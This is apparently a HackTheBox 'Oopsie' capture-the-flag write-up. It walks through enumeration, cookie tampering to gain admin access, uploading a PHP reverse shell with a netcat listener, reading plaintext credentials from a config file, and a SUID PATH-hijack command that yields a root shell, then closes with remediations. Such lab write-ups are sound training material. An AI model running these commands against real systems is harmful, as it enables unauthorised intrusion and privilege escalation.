# Oopsie — HTB Starting Point Writeup

**Difficulty:** Beginner | **OS:** Linux (Ubuntu) | **Date:** May 2026

**Topics:** Web Enumeration, Cookie Manipulation, IDOR, File Upload, SUID PATH Hijack

---

## Summary

Oopsie is a Linux-based Starting Point machine on HackTheBox. The attack chain involves discovering a hidden admin panel via source code inspection, manipulating cookies to escalate to admin access (IDOR), uploading a PHP reverse shell via the upload functionality, lateral movement through credential reuse, and privilege escalation via a SUID binary vulnerable to PATH hijacking.

---

## Reconnaissance

### Nmap Scan

```
nmap -sC -sV -p- --min-rate 5000 <TARGET-IP> -oN oopsie_nmap.txt
```

**Open Ports:**
- 22 — SSH (OpenSSH 7.6p1)
- 80 — HTTP (Apache 2.4.29)

### Web Enumeration

```
gobuster dir -u http://<TARGET-IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Page source inspection of the login page revealed a hidden path:
```
/cdn-cgi/login/
```

---

## Initial Access

### Cookie Manipulation (IDOR)

Logged in as guest via the login page. Inspecting cookies and the account page revealed the user role was stored in the cookie:

```
user=2233
role=guest
```

The admin account ID was found by visiting the Accounts page. Modifying the cookie to the admin ID and role:

```
user=1
role=admin
```

This granted access to the Uploads section.

### PHP Reverse Shell Upload

Uploaded a PHP reverse shell (php-reverse-shell.php) via the upload panel. Started a listener:

```
nc -lvnp 4444
```

Triggered the shell by navigating to:
```
http://<TARGET-IP>/uploads/php-reverse-shell.php
```

Shell received as `www-data`. Stabilized the shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

### Credential Discovery

Found plaintext credentials in the PHP config file:

```
cat /var/www/html/cdn-cgi/login/db.php
```

- **User:** robert
- **Password:** [REDACTED]

### Lateral Movement to Robert

```bash
su robert
# or
ssh robert@<TARGET-IP>
```

---

## User Flag

```
cat /home/robert/user.txt
```

**User Flag:** [REDACTED]

---

## Privilege Escalation

### Group Enumeration

```bash
id
# uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```

### SUID Binary Discovery

```bash
find / -group bugtracker 2>/dev/null
# /usr/bin/bugtracker

ls -la /usr/bin/bugtracker
# -rwsr-xr-- 1 root bugtracker

strings /usr/bin/bugtracker
# calls 'cat' without absolute path
```

### PATH Hijack

```bash
export PATH=/tmp:$PATH
echo '/bin/sh' > /tmp/cat
chmod +x /tmp/cat
bugtracker
# Enter any bug ID when prompted
```

Spawned a root shell.

```
id
# uid=0(root) gid=0(root) groups=0(root)
```

---

## Root Flag

```
cat /root/root.txt
```

**Root Flag:** [REDACTED]

---

## Findings

| # | Finding | Severity | CVSSv3 |
|---|---------|----------|--------|
| 1 | Insecure Direct Object Reference (IDOR) — Cookie Manipulation | High | 8.1 |
| 2 | Unrestricted File Upload (PHP Webshell) | Critical | 9.8 |
| 3 | Plaintext Credentials in PHP Config File | High | 7.5 |
| 4 | SUID Binary Vulnerable to PATH Hijack | High | 7.8 |

### Remediations

1. **Fix IDOR.** Validate user role and identity server-side; never trust client-supplied cookies for authorization.
2. **Restrict file uploads.** Whitelist allowed extensions, store uploads outside webroot, and never execute uploaded files.
3. **Protect config files.** Never store plaintext credentials in web-accessible files. Use environment variables or secrets management.
4. **Audit SUID binaries.** Remove unnecessary SUID permissions. Ensure SUID binaries use absolute paths for all system calls.

---

## Key Takeaways

- Always inspect page source — hidden paths are often left in comments or scripts
- Authorization logic must be enforced server-side, not via client-side cookies
- PHP file upload + webroot access = direct RCE
- Always check group memberships with `id` after lateral movement
- SUID + `strings` + no absolute path = PATH hijack opportunity
- Always run `sudo -l` and check SUID binaries after getting a shell

---

## Tools Used

- Nmap, Gobuster
- Burp Suite (cookie manipulation)
- php-reverse-shell.php (PentestMonkey)
- Netcat
